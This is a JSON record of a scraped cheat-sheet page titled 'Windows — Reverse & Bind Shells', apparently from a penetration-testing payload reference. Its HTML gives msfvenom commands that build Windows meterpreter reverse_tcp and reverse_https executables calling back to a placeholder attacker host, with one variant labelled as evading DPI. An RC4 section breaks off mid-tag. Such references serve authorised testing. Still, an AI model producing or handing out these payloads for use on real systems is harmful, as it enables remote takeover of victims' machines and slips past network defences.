{"title": "Windows — Reverse & Bind Shells", "source": "msfvenom", "source_label": "msfvenom", "path": "payloads/windows-shells", "html": "<h1 id=\"windows-reverse-bind-shells\">Windows — Reverse &amp; Bind Shells</h1>\n<h2 id=\"reverse-tcp-shells\">Reverse TCP Shells</h2>\n<h3 id=\"x86-32-bit\">x86 (32-bit)</h3>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span>-f<span class=\"w\"> </span>exe<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>shell.exe\n</code></pre></div>\n<h3 id=\"x64-64-bit\">x64 (64-bit)</h3>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/x64/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span>-f<span class=\"w\"> </span>exe<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>shell.exe\n</code></pre></div>\n<h3 id=\"https-x64-evades-dpi\">HTTPS (x64) — evades DPI</h3>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/x64/meterpreter/reverse_https<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span><span class=\"m\">443</span><span class=\"w\"> </span>-f<span class=\"w\"> </span>exe<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>shell.exe\n</code></pre></div>\n<h3 id=\"rc4-encrypted-transport\">RC4 encrypted transport</h3>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span c